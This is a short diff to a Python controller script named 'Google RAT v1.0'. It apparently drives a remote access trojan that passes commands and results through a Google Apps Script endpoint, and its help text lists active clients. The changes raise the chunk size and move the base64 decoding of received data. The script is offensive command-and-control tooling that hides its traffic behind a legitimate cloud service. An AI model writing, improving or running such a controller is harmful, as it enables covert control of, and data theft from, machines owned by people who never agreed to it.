@@ -3,7 +3,7 @@ import logging
 import requests
 import argparse
 
-CHUNK_SIZE = 2500
+CHUNK_SIZE = 35000
 LOG_FORMAT = '[%(asctime)s][%(levelname)s] %(message)s'
 BANNER = """
 *******************************************************************************
@@ -12,7 +12,7 @@ Google RAT v1.0
 # view help:
 python script.py -h
 # connect to server
-python script.py https://script.google.com/macros/s/dsfkjlksdfjlksdfjlksdf/exec
+python script.py https://script.google.com/macros/s/dfjlksdf/exec
 *******************************************************************************
 """
 
@@ -94,7 +94,7 @@ class Shell(object):
       if r.content.decode('UTF-8') == '':
         break
       logging.info('RxD[{0}]: {1}'.format(col - 3, r.content.decode('UTF-8')))
-      buf.append(r.content.decode('UTF-8'))
+      buf.append(base64.b64decode(r.content.decode('UTF-8')).decode('UTF-8'))
       col = col + 1
     # ACK download of data
     r = requests.post(args.srv, params={'Rx': '{0}'.format(base64.b64encode(''.join([s, '|2']).encode('UTF-8')).decode('UTF-8'))}, data={'d': '0'})
@@ -102,7 +102,7 @@ class Shell(object):
       logging.error('request failed: {0}'.format(r.status_code))
       return ''
     # decode result
-    return base64.b64decode(''.join(buf)).decode('UTF-8')
+    return ''.join(buf)
 
   def help(self):
     print('ls         - list all active clients')
